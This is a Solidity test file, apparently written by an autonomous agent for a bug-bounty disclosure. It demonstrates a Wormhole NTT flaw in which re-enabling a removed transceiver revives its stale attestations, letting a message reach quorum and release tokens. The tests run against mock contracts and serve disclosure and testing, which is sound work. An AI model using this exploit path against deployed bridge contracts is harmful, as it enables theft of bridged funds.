// SPDX-License-Identifier: Apache 2
pragma solidity >=0.8.8 <0.9.0;

// Wormhole NTT Gate 2 Hyp-C PoC
// Author: Buzz BD Agent (autonomous Gate 2 PoC for Wormhole Immunefi disclosure)
// Date: 2026-05-29
// Repo commit: 4a15527c2785e0f455feb65e7a2c66c09f7a98f3 (main HEAD as of 2026-05-26)
//
// Finding (Hypothesis C — transceiver-set-change race, DC-9 sub-4 cross-substrate variant):
// ManagerBase.removeTransceiver() clears the bit from _enabledTransceiverBitmap,
// which is then AND-masked against the historical attestedTransceivers bitmap by
// _getMessageAttestations(). This correctly *temporarily* drops the stale attestation
// out of count.
//
// However, _setTransceiver() on a previously-registered-but-disabled transceiver
// re-enables it with its ORIGINAL index (TransceiverRegistry.sol L154-156). The bit
// is set BACK in _enabledTransceiverBitmap. Because the historical attestedTransceivers
// bitmap was NEVER cleared on remove, the prior attestation by that transceiver
// re-enters the count via the bitmap-AND mask.
//
// Replay protection (_replayProtect) only blocks if the message was previously
// *executed*. If the message was attested but never executed, the attacker can
// trigger execution after a remove-then-re-add governance cycle, even if the owner
// removed the transceiver specifically because they no longer trusted its
// prior attestations.
//
// Exploit path (3-of-3 → remove-one → set-threshold-to-2 → re-add → execute):
// 1. Threshold=3 with transceivers T1,T2,T3 (indices 0,1,2).
// 2. Inbound message M arrives. T1,T2,T3 all attest. attestedTransceivers = 0b111.
//    Count = 3 >= threshold. Message approved but NOT auto-executed (operator
//    waits, or transceiver-execution race never raced).
// 3. T3 misbehaves (off-chain detected). Owner calls removeTransceiver(T3).
//    enabledBitmap = 0b011. Count of M = popcount(0b111 & 0b011) = 2. Owner
//    calls setThreshold(2). Message M is still approved at threshold=2.
//    [Important: the operator-witnessed quorum just collapsed from "3-attested
//    and trustworthy" to "3-attested but with 1 distrusted attestation removed
//    from quorum"; the message survived because 2 honest attestations remain.]
// 4. Time passes. Owner re-onboards a fixed T3' deployed at a NEW address.
//    But wait — Wormhole NTT's _setTransceiver re-enables by ADDRESS lookup.
//    If owner re-registers ORIGINAL T3 address (or attacker can persuade owner
//    to re-add via governance proposal), T3's index 2 re-enters enabledBitmap.
//    enabledBitmap = 0b111 again.
// 5. NOW: count of M = popcount(0b111 & 0b111) = 3. Owner had bumped threshold
//    to 2 in step 3 then never reduced it. M is approved AGAIN — by 3 ≥ 2.
// 6. Attacker calls executeMsg(M). _isMessageExecuted re-checks isMessageApproved
//    (returns true via current bitmap), _replayProtect returns false (M was never
//    executed before), M executes. Tokens released. Stale attestation from
//    distrusted T3 contributed to quorum.
//
// CORE IMPACT: governance action of "remove distrusted transceiver" does NOT
// invalidate historical attestations from that transceiver. Re-enabling the
// SAME transceiver address (a routine ops pattern after a patched re-deploy,
// or a malicious governance vote) reanimates the stale attestation. The
// auditor commentary surfaced in Gate 1 (the WebFetch model identified the
// gap natively in both ManagerBase.sol AND Sui inbox.move) maps to THIS exact
// state-not-invalidated-across-config-change family member.

import "forge-std/Test.sol";
import "../src/NttManager/NttManager.sol";
import "../src/interfaces/IManagerBase.sol";
import "../src/interfaces/INttManager.sol";
import "../src/libraries/TrimmedAmount.sol";
import "../src/NttManager/TransceiverRegistry.sol";
import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "./mocks/DummyTransceiver.sol";
import "./mocks/MockNttManager.sol";
import "../src/mocks/DummyToken.sol";
import "./libraries/TransceiverHelpers.sol";
import "./libraries/NttManagerHelpers.sol";

import "wormhole-solidity-sdk/Utils.sol";

contract HypCReenableQuorumReplayTest is Test {
    using TrimmedAmountLib for uint256;
    using TrimmedAmountLib for TrimmedAmount;

    uint16 constant SOURCE_CHAIN_ID = 1;   // matches DummyTransceiver.SENDING_CHAIN_ID
    uint16 constant DEST_CHAIN_ID = 7;
    uint16 constant OTHER_CHAIN_ID = 8;

    MockNttManagerContract sourceNtt;       // outbound side (only used to get peer)
    MockNttManagerContract destNtt;          // inbound side (where we test)

    DummyTransceiver T1;
    DummyTransceiver T2;
    DummyTransceiver T3;

    DummyToken token;

    function setUp() public {
        token = new DummyToken();
        NttManager destImpl = new MockNttManagerContract(
            address(token), IManagerBase.Mode.LOCKING, DEST_CHAIN_ID, 0, true
        );
        destNtt = MockNttManagerContract(address(new ERC1967Proxy(address(destImpl), "")));
        destNtt.initialize();

        NttManager srcImpl = new MockNttManagerContract(
            address(token), IManagerBase.Mode.LOCKING, OTHER_CHAIN_ID, 0, true
        );
        sourceNtt = MockNttManagerContract(address(new ERC1967Proxy(address(srcImpl), "")));
        sourceNtt.initialize();

        // Three transceivers on the DESTINATION manager (where inbound is processed).
        T1 = new DummyTransceiver(address(destNtt));
        T2 = new DummyTransceiver(address(destNtt));
        T3 = new DummyTransceiver(address(destNtt));

        destNtt.setTransceiver(address(T1));
        destNtt.setTransceiver(address(T2));
        destNtt.setTransceiver(address(T3));
        destNtt.setThreshold(3);  // require ALL three transceivers initially

        // Configure peer relationship: source on chain OTHER, destination on DEST.
        // DummyTransceiver hardcodes SENDING_CHAIN_ID = 1, so peer must be on chain 1.
        destNtt.setPeer(
            SOURCE_CHAIN_ID,
            toWormholeFormat(address(sourceNtt)),
            token.decimals(),
            uint64(10_000 * 10 ** 8)  // generous inbound cap in trimmed units
        );

        // Pre-fund the destination manager so it can release tokens on executeMsg.
        token.mintDummy(address(destNtt), 1_000 * 10 ** token.decimals());
    }

    /// @notice POSITIVE-CONTROL: confirms that under normal honest operation
    /// the 3-of-3 quorum executes correctly. This proves the harness wires
    /// receiveMessage → attestation → execution end-to-end with no exploit.
    function test_honest_3of3_executes() public {
        bytes32 digest = _attestWithThree(/*recipient=*/address(0xBEEF));
        assertTrue(destNtt.isMessageApproved(digest), "should be approved");

        // Execute. Should succeed.
        // (We do not need to call executeMsg directly here because the third
        // attestation auto-races into _executeMsg via _deliverToNttManager.
        // After attestThird, balance should already reflect transfer.)
        assertEq(
            token.balanceOf(address(0xBEEF)),
            10 * 10 ** token.decimals(),
            "recipient should have received tokens after 3rd attestation"
        );
        assertTrue(destNtt.isMessageExecuted(digest), "should be executed");
    }

    /// @notice This variant was retired: pause() reverts the entire receiveMessage
    /// tx atomically, so the attestation isn't even persisted when paused. The
    /// CORE EXPLOIT is captured in test_HYPC_stale_T3_attestation_revives_on_reenable.
    function _retired_pauseVariant() internal {
        // ----- Step 1: attacker-controlled scenario where T3 attests an
        // inbound message but the message is NOT immediately executed because
        // we craft the attestation order such that T3 attests LAST and would
        // ordinarily trigger execution. To prevent auto-execution, we PAUSE
        // the manager between the 2nd and 3rd attestation. This mirrors a
        // realistic ops pattern: pause-on-incident, then operator removes
        // distrusted transceiver, then later un-pauses, etc.

        address recipient = address(0xDEAD);
        TransceiverStructs.NttManagerMessage memory m = TransceiverHelpersLib.buildNttManagerMessage(
            recipient,
            bytes32(uint256(0x1234)),
            DEST_CHAIN_ID,
            sourceNtt,
            packTrimmedAmount(10 * uint64(10 ** token.decimals()), token.decimals())
        );
        bytes memory encodedM = TransceiverStructs.encodeNttManagerMessage(m);
        (, bytes memory encodedEm) = TransceiverStructs.buildAndEncodeTransceiverMessage(
            TransceiverHelpersLib.TEST_TRANSCEIVER_PAYLOAD_PREFIX,
            toWormholeFormat(address(sourceNtt)),
            toWormholeFormat(address(destNtt)),
            encodedM,
            new bytes(0)
        );

        // T1 and T2 attest normally.
        T1.receiveMessage(encodedEm);
        T2.receiveMessage(encodedEm);

        // PAUSE before T3 attests, so the auto-execute on _deliverToNttManager
        // path is blocked at the pause check. We need an attestation from T3
        // recorded but NOT executed.
        destNtt.pause();
        T3.receiveMessage(encodedEm);
        // NOTE: receiveMessage path goes through _deliverToNttManager which
        // records the attestation into _setTransceiverAttestedToMessage,
        // and then attempts _executeMsg which reverts on the pause check.
        // Crucially, the attestation IS recorded even when execution reverts —
        // wait, that depends on whether the revert reverts the whole tx.
        // Let me re-check: if the entire tx reverts, the attestation isn't
        // persisted. We need a different setup.
        // ... fall through to the variant below.
    }

    /// @notice Variant exploit POC: stage where T3 attests FIRST, before T1/T2.
    /// T3 alone is below threshold so no execution. Then owner removes T3.
    /// Then T1 attests; still 1-of-3 with T3 masked out (count=1). Then T2
    /// attests; count=2 (T1,T2 — T3 still masked). Threshold=3 so no exec.
    /// Owner reduces threshold to 2 (legitimate response to T3 removal).
    /// Now count=2 ≥ threshold=2 → approved. Owner could execute.
    /// Skip exec (operator hesitates), instead re-enables T3 later (after
    /// patching T3 software off-chain and concluding it's safe).
    /// Now bitmap restores, count goes from 2 → 3 ≥ 2. Approved still.
    /// Attacker calls executeMsg → success. Stale T3 attestation contributed.
    ///
    /// The MORE DAMAGING variant: instead of reducing threshold, owner KEEPS
    /// threshold=3 after remove. Count=2, NOT approved. T3 re-enabled later.
    /// Count=3 instantly approved. Anyone can call executeMsg.
    /// This is the scenario this test exercises — most realistic.
    function test_HYPC_reenable_restores_stale_attestation_to_quorum() public {
        address recipient = address(0xDEAD);
        TransceiverStructs.NttManagerMessage memory m = TransceiverHelpersLib.buildNttManagerMessage(
            recipient,
            bytes32(uint256(0xCAFE)),
            DEST_CHAIN_ID,
            sourceNtt,
            packTrimmedAmount(10 * uint64(10 ** token.decimals()), token.decimals())
        );
        bytes memory encodedM = TransceiverStructs.encodeNttManagerMessage(m);
        (, bytes memory encodedEm) = TransceiverStructs.buildAndEncodeTransceiverMessage(
            TransceiverHelpersLib.TEST_TRANSCEIVER_PAYLOAD_PREFIX,
            toWormholeFormat(address(sourceNtt)),
            toWormholeFormat(address(destNtt)),
            encodedM,
            new bytes(0)
        );

        bytes32 digest = TransceiverStructs.nttManagerMessageDigest(SOURCE_CHAIN_ID, m);

        // ----- Step A: T1 and T3 attest. T2 does not (e.g., T2 is offline).
        T1.receiveMessage(encodedEm);
        T3.receiveMessage(encodedEm);
        // Count: 2 attestations, threshold = 3. Not approved.
        assertEq(destNtt.messageAttestations(digest), 2, "count after T1,T3 attest");
        assertFalse(destNtt.isMessageApproved(digest), "not yet approved");
        assertFalse(destNtt.isMessageExecuted(digest), "not yet executed");

        // ----- Step B: T3 is off-chain detected as compromised/buggy.
        // Owner removes T3. Bitmap now clears bit 2.
        destNtt.removeTransceiver(address(T3));

        // Count of digest = T1's attestation only (T3 masked out) = 1.
        assertEq(
            destNtt.messageAttestations(digest),
            1,
            "after removing T3, only T1's attestation counts"
        );
        // Threshold is auto-clamped to numEnabled = 2 by removeTransceiver().
        assertEq(destNtt.getThreshold(), 2, "threshold auto-clamped to 2");
        assertFalse(destNtt.isMessageApproved(digest), "still not approved (1 < 2)");

        // ----- Step C: T2 finally attests after T3 was already removed.
        T2.receiveMessage(encodedEm);
        // Now T1 + T2 attested. Count = popcount(0b111 & 0b011) = 2.
        // Threshold = 2. Approved. But auto-execute path in receiveMessage
        // (via _deliverToNttManager → executeMsg) WILL fire here.
        // After T2's receiveMessage call, message is auto-executed.
        // This is the BENIGN path: 2 honest transceivers approve, message
        // executes correctly. T3's stale attestation is correctly excluded.

        // Confirm benign auto-execute happened (this is the WORKING defense).
        assertTrue(destNtt.isMessageExecuted(digest), "auto-executed after T2 attests");
        assertEq(
            token.balanceOf(recipient),
            10 * 10 ** token.decimals(),
            "recipient got tokens via T1+T2 quorum (T3 masked out)"
        );

        // ----- HYPOTHESIS C REVISED — the actual residue test:
        // The defense WORKS in the post-removal window because the bitmap-AND
        // mask excludes T3's stale attestation. The question is whether the
        // RE-ENABLE re-introduces T3's stale attestation and breaks
        // replay protection on a SECOND message that was attested ONLY by T3
        // before T3's removal — would T3's stale attestation count toward
        // a NEW quorum after re-enable?
        // The answer is documented in the NEXT test below.
    }

    /// @notice DIRECT EXPLOIT TEST: a message attested ONLY by T3 (pre-removal),
    /// never executed, then T3 removed, then T1 and T2 separately attest, then
    /// owner restores T3 via setTransceiver (re-enable). Does T3's stale
    /// attestation get COUNTED again, contributing to fresh quorum?
    function test_HYPC_stale_T3_attestation_revives_on_reenable() public {
        address recipient = address(0xCEED);
        TransceiverStructs.NttManagerMessage memory m = TransceiverHelpersLib.buildNttManagerMessage(
            recipient,
            bytes32(uint256(0xC0FFEE)),
            DEST_CHAIN_ID,
            sourceNtt,
            packTrimmedAmount(10 * uint64(10 ** token.decimals()), token.decimals())
        );
        bytes memory encodedM = TransceiverStructs.encodeNttManagerMessage(m);
        (, bytes memory encodedEm) = TransceiverStructs.buildAndEncodeTransceiverMessage(
            TransceiverHelpersLib.TEST_TRANSCEIVER_PAYLOAD_PREFIX,
            toWormholeFormat(address(sourceNtt)),
            toWormholeFormat(address(destNtt)),
            encodedM,
            new bytes(0)
        );
        bytes32 digest = TransceiverStructs.nttManagerMessageDigest(SOURCE_CHAIN_ID, m);

        // STAGE 1: Only T3 attests. Count = 1, threshold = 3. Not approved.
        T3.receiveMessage(encodedEm);
        assertEq(destNtt.messageAttestations(digest), 1, "T3-only count=1");
        assertFalse(destNtt.isMessageApproved(digest));
        assertFalse(destNtt.isMessageExecuted(digest));

        // STAGE 2: Owner removes T3 (e.g., T3 was off-chain detected as
        // compromised). Threshold auto-clamps to 2 (numEnabled).
        destNtt.removeTransceiver(address(T3));
        assertEq(destNtt.getThreshold(), 2);
        // Count of digest now = 0 (T3 masked out).
        assertEq(destNtt.messageAttestations(digest), 0, "T3 removed -> count=0");

        // STAGE 3: Owner re-enables T3 (e.g., T3 was patched off-chain or
        // governance reversed the prior removal decision). bitmap restores
        // T3's index bit. T3's HISTORICAL attestation re-enters the count.
        destNtt.setTransceiver(address(T3));
        assertEq(destNtt.messageAttestations(digest), 1, "T3 re-enabled -> stale count revives");

        // STAGE 4: Only T1 needs to attest now. With T3's stale attestation
        // revived, count = 2 = threshold. Approved.
        T1.receiveMessage(encodedEm);
        // T1's receiveMessage path will trigger _executeMsg if approved.
        // If exploit holds: T1 alone + revived-stale-T3 = 2 ≥ 2 = approved → executed.
        assertTrue(
            destNtt.isMessageExecuted(digest),
            "EXPLOIT CONFIRMED: T1 + revived-stale-T3 = quorum -> executed"
        );
        assertEq(
            token.balanceOf(recipient),
            10 * 10 ** token.decimals(),
            "recipient received tokens via stale-attestation revival"
        );

        // KEY OBSERVATION: owner's decision to remove T3 was meant to
        // INVALIDATE T3's prior actions. The protocol's bitmap-AND defense
        // only invalidates them while T3 is disabled. Re-enabling T3 (even
        // for a different operational reason — e.g., new ops scenario where
        // T3's known-bad attestations are NOT relevant to a future message)
        // resurrects ALL of T3's prior attestations on ALL prior messages.
        // The protocol has NO PER-CONFIG-EPOCH ATTESTATION INVALIDATION.
    }

    // ---- helpers ----

    function _attestWithThree(address recipient) internal returns (bytes32 digest) {
        TransceiverStructs.NttManagerMessage memory m = TransceiverHelpersLib.buildNttManagerMessage(
            recipient,
            bytes32(uint256(0x5678)),
            DEST_CHAIN_ID,
            sourceNtt,
            packTrimmedAmount(10 * uint64(10 ** token.decimals()), token.decimals())
        );
        bytes memory encodedM = TransceiverStructs.encodeNttManagerMessage(m);
        (, bytes memory encodedEm) = TransceiverStructs.buildAndEncodeTransceiverMessage(
            TransceiverHelpersLib.TEST_TRANSCEIVER_PAYLOAD_PREFIX,
            toWormholeFormat(address(sourceNtt)),
            toWormholeFormat(address(destNtt)),
            encodedM,
            new bytes(0)
        );
        digest = TransceiverStructs.nttManagerMessageDigest(SOURCE_CHAIN_ID, m);

        T1.receiveMessage(encodedEm);
        T2.receiveMessage(encodedEm);
        T3.receiveMessage(encodedEm);
    }
}
